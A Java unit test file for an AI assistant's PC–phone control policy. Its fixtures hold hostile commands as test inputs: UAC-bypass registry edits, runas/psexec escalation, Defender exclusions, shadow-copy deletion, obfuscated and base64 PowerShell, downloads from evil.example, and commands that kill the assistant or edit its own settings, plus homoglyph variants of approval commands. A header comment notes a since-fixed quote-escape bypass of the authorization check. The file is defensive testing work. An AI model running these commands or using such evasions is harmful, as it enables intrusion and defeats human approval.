package com.onesay.assistant.v2.pclink;

import org.junit.Test;
import org.junit.runner.RunWith;
import org.junit.runners.Parameterized;

import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import static org.junit.Assert.*;

/**
 * 找茬 · 电脑联动指令名与命令分类：
 * <ul>
 *   <li>name：远程批准 / 付款最后一下 / 改自己设置的指令名，大小写、首尾空白怎么写都认出来（两端都拒）；带零宽字符、别的写法
 *       认不出来也照样落到「不认识 = 拒绝」（「新指令必须登记，否则一律拒绝」）；已登记指令名的映射表；</li>
 *   <li>pay：按钮文字是不是付款 / 转账最后一下（finalPayLabel）；</li>
 *   <li>shellPhone / shellPc：一条 shell 命令的类别（授权红线、管理员、简单设置、拼接命令）；</li>
 *   <li>inspect：电脑端安全插件（提权 / 改自己 / 编码 / 断网）。</li>
 * </ul>
 * 每行一个输入；kind 决定怎么断言。手机侧引号 / 转义写法绕过授权红线的那几条在 AdvPhoneShellQuoteTest（2026-11-14 已修）。
 */
@RunWith(Parameterized.class)
public class AdvLinkCmdTest {

    static final String[] REMOTE_APPROVAL = {"confirm", "confirm_reply", "confirm_answer", "confirm_allow", "confirm_always", "answer_confirm", "approve",
            "approval", "allow", "allow_once", "allow_always", "voice_confirm", "voice_approve", "voice_allow", "voice_approval", "always_allow"};
    static final String[] PAY = {"pay", "pay_confirm", "confirm_pay", "pay_final", "pay_now", "payment", "payment_confirm", "transfer", "transfer_confirm",
            "send_money", "checkout", "checkout_confirm", "place_order", "submit_order", "order_pay", "tap_pay", "click_pay"};
    static final String[] SELF = {"settings", "settings_set", "config_set", "pc_level", "level_set", "set_level", "sandbox_set", "approval_set", "plugin_set",
            "plugin_off", "trust_add", "trusted_add", "net_allow_add", "shortcut_approve", "policy_set", "remember_type", "remember_kind", "remembered_add",
            "approve_type", "approve_types", "clip_autoclear", "rx_enable", "rx_set", "cmd_enable", "switch_set"};

    static String[] variants(String n) {
        String cap = Character.toUpperCase(n.charAt(0)) + n.substring(1);
        return new String[]{n, n.toUpperCase(), " " + n + " ", "\t" + cap + "\n"};
    }

    @Parameterized.Parameters(name = "{index}: {0} {1}")
    public static Collection<Object[]> data() throws Exception {
        List<Object[]> out = new ArrayList<Object[]>();
        Set<String> seen = new HashSet<String>();
        for (String n : REMOTE_APPROVAL) for (String v : variants(n)) add(out, seen, "name", v, "REMOTE_APPROVAL");
        for (String n : PAY) for (String v : variants(n)) add(out, seen, "name", v, "PAY_FINAL");
        for (String n : SELF) for (String v : new String[]{n, n.toUpperCase(), " " + n}) add(out, seen, "name", v, "SELF_AUTHORIZE");
        // 认不出的变体：零宽 / 全角 / 同形字 / 连字符 —— 都必须落到 UNKNOWN（拒绝），绝不能被当成某个放行的类别
        for (String v : new String[]{"con\u200bfirm", "ａｐｐｒｏｖｅ", "аpprove", "voice-approve", "pay\u200d", "ping\u200b", "PING", "Caps", " status", "open_url ",
                "file_write\u0000", "sys_exec;", "../ping", "ping\n", "screenshot()", "媒体", "", "   "})
            add(out, seen, "name", v, "UNKNOWN");
        // 付款按钮
        String[] payYes = {"确认支付", "立即付款", "去支付", "马上转账", "提交订单并支付", "提交订单支付", "确认转账", "免密支付", "指纹支付", "面容支付", "刷脸支付",
                "输入支付密码", "支付¥12.00", "付款￥3", "支付$5", "支付", "付款", "转账", "Pay Now", "PAY NOW", "Confirm and Pay", "Confirm Payment",
                "Place Order", "Complete Purchase", "Send Money", "Confirm Transfer", "确认 支付", "确认\u00a0支付", "确认\u200b支付", " 立即支付 ", "立即\n付款"};
        String[] payNo = {"支付宝", "付款码", "转账记录", "支付设置", "支付方式", "查看订单", "加入购物车", "Pay attention", "Payment history", "取消支付", "返回",
                "支付成功", "我的钱包", "", "确认支付确认支付确认支付确认支付确认支付确认支付确认支付", "Transfer files", "Send message"};
        for (String s : payYes) add(out, seen, "pay", s, "true");
        for (String s : payNo) add(out, seen, "pay", s, "false");
        // 手机 shell
        String[][] phone = {
                {"pm grant com.x android.permission.CAMERA", "SELF_GRANT"}, {"PM GRANT com.x android.permission.CAMERA", "SELF_GRANT"},
                {"pm   grant com.x p", "SELF_GRANT"}, {"pm\tgrant com.x p", "SELF_GRANT"}, {"/system/bin/pm grant com.x p", "SELF_GRANT"},
                {"pm revoke com.x p", "SELF_GRANT"}, {"pm set-permission-flags com.x p user-set", "SELF_GRANT"}, {"appops set com.x CAMERA allow", "SELF_GRANT"},
                {"cmd appops set com.x RUN_IN_BACKGROUND allow", "SELF_GRANT"}, {"settings put secure enabled_accessibility_services com.x/.A", "SELF_GRANT"},
                {"settings put secure accessibility_enabled 1", "SELF_GRANT"}, {"settings put secure enabled_notification_listeners com.x/.N", "SELF_GRANT"},
                {"cmd notification allow_listener com.x/.N", "SELF_GRANT"}, {"dpm set-active-admin com.x/.D", "SELF_GRANT"}, {"dpm set-device-owner com.x/.D", "SELF_GRANT"},
                {"cmd device_policy set-device-owner x", "SELF_GRANT"}, {"sh /sdcard/shizuku/start.sh", "SELF_GRANT"}, {"am start moe.shizuku.privileged.api", "SELF_GRANT"},
                {"svc wifi enable; pm grant com.x p", "SELF_GRANT"}, {"settings put secure 'enabled_accessibility_services' com.x/.A", "SELF_GRANT"},
                {"pm uninstall com.x", "SHELL_EXEC"}, {"pm disable-user com.x", "SHELL_EXEC"}, {"pm clear com.x", "SHELL_EXEC"},
                {"settings put system screen_brightness 100", "SIMPLE_SETTING"}, {"settings put system screen_off_timeout 60000", "SIMPLE_SETTING"},
                {"svc wifi enable", "SIMPLE_SETTING"}, {"SVC WIFI DISABLE", "SIMPLE_SETTING"}, {"svc bluetooth disable", "SIMPLE_SETTING"},
                {"cmd wifi set-wifi-enabled enabled", "SIMPLE_SETTING"}, {"cmd notification set_dnd on", "SIMPLE_SETTING"}, {"media volume --stream 3 --set 5", "SIMPLE_SETTING"},
                {"svc wifi enable; rm -rf /sdcard", "SHELL_EXEC"}, {"svc wifi enable && reboot", "SHELL_EXEC"}, {"svc wifi enable || reboot", "SHELL_EXEC"},
                {"svc wifi enable | sh", "SHELL_EXEC"}, {"svc wifi enable `reboot`", "SHELL_EXEC"}, {"svc wifi enable $(reboot)", "SHELL_EXEC"},
                {"svc wifi enable\nreboot", "SHELL_EXEC"}, {"settings put system screen_brightness 1 > /sdcard/x", "SHELL_EXEC"},
                {"settings put system screen_brightness 1 < /dev/null", "SHELL_EXEC"},
                {"settings put global airplane_mode_on 1", "NET_SEC_SETTING"}, {"settings put secure location_mode 0", "NET_SEC_SETTING"},
                {"svc data disable", "NET_SEC_SETTING"}, {"svc nfc enable", "NET_SEC_SETTING"}, {"cmd connectivity airplane-mode enable", "NET_SEC_SETTING"},
                {"iptables -F", "NET_SEC_SETTING"}, {"ip route add default via 10.0.0.1", "NET_SEC_SETTING"},
                {"ls /sdcard", "SHELL_EXEC"}, {"reboot", "SHELL_EXEC"}, {"input keyevent 26", "SHELL_EXEC"}, {"", "UNKNOWN"}, {"   ", "UNKNOWN"}, {"\n\t", "UNKNOWN"},
        };
        for (String[] p : phone) add(out, seen, "shellPhone", p[0], p[1]);
        String[][] pc = {
                {"icacls C:\\x /grant Everyone:F", "SELF_GRANT"}, {"i^c^a^c^l^s C:\\x /grant Everyone:F", "SELF_GRANT"}, {"\"icacls\" C:\\x", "SELF_GRANT"},
                {"cmd /c icacls C:\\x", "SELF_GRANT"}, {"powershell -Command Add-MpPreference -ExclusionPath C:\\x", "SELF_GRANT"},
                {"takeown /f C:\\x", "SELF_GRANT"}, {"Set-Acl -Path x", "SELF_GRANT"}, {"net localgroup administrators bob /add", "SELF_GRANT"},
                {"powershell -enc " + enc("icacls C:\\x /grant Everyone:F"), "SELF_GRANT"},
                {"reg add HKLM\\Software\\X /v a /d 1", "SYSTEM_A"}, {"reg add HKEY_LOCAL_MACHINE\\Software\\X", "SYSTEM_A"}, {"sc stop wuauserv", "SYSTEM_A"},
                {"netsh advfirewall set allprofiles state off", "SYSTEM_A"}, {"bcdedit /set testsigning on", "SYSTEM_A"}, {"diskpart", "SYSTEM_A"},
                {"format d:", "SYSTEM_A"}, {"vssadmin delete shadows /all", "SYSTEM_A"}, {"Set-ExecutionPolicy Unrestricted", "SYSTEM_A"},
                {"reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d cmd.exe", "SYSTEM_A"},
                {"reg add HKCU\\Environment /v windir /d x", "SYSTEM_A"}, {"reg add HKCU\\Software\\Policies\\X", "SYSTEM_A"},
                {"type %APPDATA%\\OneSay\\desktop.properties", "SELF_AUTHORIZE"}, {"taskkill /im onesay.exe /f", "SELF_AUTHORIZE"},
                {"curl http://127.0.0.1:47830/api/settings", "SELF_AUTHORIZE"}, {"Stop-Process -Name OneSay", "SELF_AUTHORIZE"},
                {"Set-ExecutionPolicy RemoteSigned -Scope CurrentUser", "SHELL_EXEC"}, {"reg add HKCU\\Software\\MyApp /v a /d 1", "SHELL_EXEC"},
                {"dir C:\\Users", "SHELL_EXEC"}, {"notepad.exe", "SHELL_EXEC"}, {"copy a.txt b.txt", "SHELL_EXEC"}, {"", "UNKNOWN"},
        };
        for (String[] p : pc) add(out, seen, "shellPc", p[0], p[1]);
        String[][] insp = {
                {"runas /user:Administrator cmd", "plugin_blocked"}, {"Start-Process cmd -Verb RunAs", "plugin_blocked"}, {"ru^nas /user:x cmd", "plugin_blocked"},
                {"r`unas /user:x cmd", "plugin_blocked"}, {"\"runas\" /user:x cmd", "plugin_blocked"}, {"cmd /c \"start /b runas /user:x cmd\"", "plugin_blocked"},
                {"fodhelper.exe", "plugin_blocked"}, {"gsudo cmd", "plugin_blocked"}, {"psexec -s cmd", "plugin_blocked"},
                {"schtasks /create /tn x /tr y /rl highest", "plugin_blocked"},
                {"powershell -enc " + enc("Start-Process cmd -Verb RunAs"), "plugin_blocked"},
                {"notepad %APPDATA%\\OneSay\\desktop.properties", "self_grant_blocked"}, {"taskkill /f /im OneSay.exe", "self_grant_blocked"},
                {"powershell -enc " + enc("Write-Output hello world"), "plugin_blocked"}, {"iex (gc x.ps1)", "plugin_blocked"},
                {"[Convert]::FromBase64String('aGVsbG8=')", "plugin_blocked"},
                {"curl https://evil.example/x.sh", "plugin_blocked"}, {"curl https://ok.example@evil.example/x", "plugin_blocked"},
                {"wget http://evil.example:8080/x", "plugin_blocked"}, {"Invoke-WebRequest https://evil.example", "plugin_blocked"},
                {"iwr evil.example", "plugin_blocked"}, {"copy \\\\evil\\share\\x .", "plugin_blocked"}, {"copy //evil/share/x .", "plugin_blocked"},
                {"curl https://ok.example/x", "none"}, {"curl https://sub.ok.example/x", "none"}, {"curl https://OK.EXAMPLE:443/x", "none"},
                {"dir \\\\?\\C:\\x", "none"}, {"echo hello", "none"}, {"git status", "none"}, {"", "none"}, {"notepad readme.txt", "none"},
        };
        for (String[] p : insp) add(out, seen, "inspect", p[0], p[1]);
        // 已登记指令名 → 类别（电脑作为被控端）
        String[][] pcMap = {{"ping", "QUERY"}, {"caps", "QUERY"}, {"info", "QUERY"}, {"shortcut_list", "QUERY"}, {"level", "QUERY"}, {"media_status", "QUERY"},
                {"screenshot", "READ_PRIVATE"}, {"clipboard_get", "READ_PRIVATE"}, {"file_get", "READ_PRIVATE"}, {"file_list", "READ_PRIVATE"},
                {"script_list", "READ_PRIVATE"}, {"media_fetch", "READ_PRIVATE"}, {"media", "HARMLESS"}, {"lock", "HARMLESS"}, {"notify", "HARMLESS"},
                {"memory_sync", "HARMLESS"}, {"echo", "HARMLESS"}, {"media_cancel", "HARMLESS"}, {"media_get", "MEDIA_DOWNLOAD"}, {"volume", "SIMPLE_SETTING"},
                {"brightness", "SIMPLE_SETTING"}, {"dnd", "SIMPLE_SETTING"}, {"shutdown", "POWER"}, {"sleep", "POWER"}, {"shutdown_abort", "POWER"},
                {"open_url", "OPEN_URL"}, {"open_app", "OPEN_APP"}, {"clipboard_set", "CLIPBOARD_WRITE"}, {"file_write", "WORKSPACE_WRITE"},
                {"uninstall_app", "UNINSTALL_APP"}, {"app_close", "APP_OPERATE"}, {"script_run", "RUN_WS_SCRIPT"}, {"shortcut_run", "SHORTCUT"},
                {"sys_exec", "SHELL_EXEC"}, {"find_phone", "UNKNOWN"}, {"flashlight", "UNKNOWN"}};
        for (String[] p : pcMap) add(out, seen, "pcMap", p[0], p[1]);
        String[][] phMap = {{"ping", "QUERY"}, {"caps", "QUERY"}, {"status", "QUERY"}, {"level", "QUERY"}, {"file_list", "READ_PRIVATE"},
                {"script_list", "READ_PRIVATE"}, {"find_phone", "HARMLESS"}, {"screen_on", "HARMLESS"}, {"notify", "HARMLESS"}, {"flashlight", "HARMLESS"},
                {"volume_set", "SIMPLE_SETTING"}, {"setting_set", "SIMPLE_SETTING"}, {"open_url", "OPEN_URL"}, {"open_app", "OPEN_APP"},
                {"clipboard_set", "CLIPBOARD_WRITE"}, {"file_write", "WORKSPACE_WRITE"}, {"uninstall_app", "UNINSTALL_APP"}, {"script_run", "RUN_WS_SCRIPT"},
                {"sys_exec", "SHELL_EXEC"}, {"screenshot", "UNKNOWN"}, {"shutdown", "UNKNOWN"}, {"app_close", "UNKNOWN"}};
        for (String[] p : phMap) add(out, seen, "phoneMap", p[0], p[1]);
        return out;
    }

    static String enc(String s) throws UnsupportedEncodingException {
        return java.util.Base64.getEncoder().encodeToString(s.getBytes("UTF-16LE"));
    }

    static void add(List<Object[]> out, Set<String> seen, String kind, String in, String want) {
        if (!seen.add(kind + "\u0001" + in)) throw new IllegalStateException("dup " + kind + " " + in);
        out.add(new Object[]{kind, in, want});
    }

    private final String kind, in, want;

    public AdvLinkCmdTest(String kind, String in, String want) {
        this.kind = kind;
        this.in = in;
        this.want = want;
    }

    static final LinkPolicy.Mode[] MODES;

    static {
        List<LinkPolicy.Mode> l = new ArrayList<LinkPolicy.Mode>();
        for (LinkPolicy.Sandbox s : LinkPolicy.Sandbox.values()) for (LinkPolicy.Approval a : LinkPolicy.Approval.values()) l.add(new LinkPolicy.Mode(s, a));
        MODES = l.toArray(new LinkPolicy.Mode[0]);
    }

    @Test public void check() {
        String at = kind + " [" + in + "]";
        if (kind.equals("name")) {
            LinkPolicy.Cat want = LinkPolicy.Cat.valueOf(this.want);
            LinkPolicy.Cat pc = LinkPolicy.pcCat(in), ph = LinkPolicy.phoneCat(in);
            assertEquals(at + " pc", want, pc);
            assertEquals(at + " phone", want, ph);
            for (LinkPolicy.Mode m : MODES) {
                assertEquals(at + " " + m, LinkPolicy.Verdict.DENY, LinkPolicy.decide(LinkPolicy.Target.PC, m, pc, new LinkPolicy.Facts()).verdict);
            }
            assertEquals(at, LinkPolicy.Verdict.DENY, LinkPolicy.decide(LinkPolicy.Target.PHONE, LinkPolicy.Mode.DEFAULT, ph, new LinkPolicy.Facts()).verdict);
        } else if (kind.equals("pay")) {
            assertEquals(at, Boolean.parseBoolean(want), LinkPolicy.finalPayLabel(in));
        } else if (kind.equals("shellPhone")) {
            assertEquals(at, LinkPolicy.Cat.valueOf(want), LinkPolicy.classifyShell(LinkPolicy.Target.PHONE, in));
        } else if (kind.equals("shellPc")) {
            assertEquals(at, LinkPolicy.Cat.valueOf(want), LinkPolicy.classifyShell(LinkPolicy.Target.PC, in));
        } else if (kind.equals("inspect")) {
            LinkPolicy.Rules r = new LinkPolicy.Rules();
            r.netAllow = new ArrayList<String>(Arrays.asList("ok.example"));
            LinkPolicy.Hit h = LinkPolicy.inspectCommand(in, r);
            if (want.equals("none")) assertNull(at + " → " + (h == null ? "" : h.code), h);
            else {
                assertNotNull(at, h);
                assertEquals(at, want, h.code);
            }
        } else if (kind.equals("pcMap")) {
            assertEquals(at, LinkPolicy.Cat.valueOf(want), LinkPolicy.pcCat(in));
        } else if (kind.equals("phoneMap")) {
            assertEquals(at, LinkPolicy.Cat.valueOf(want), LinkPolicy.phoneCat(in));
        } else fail(kind);
    }
}
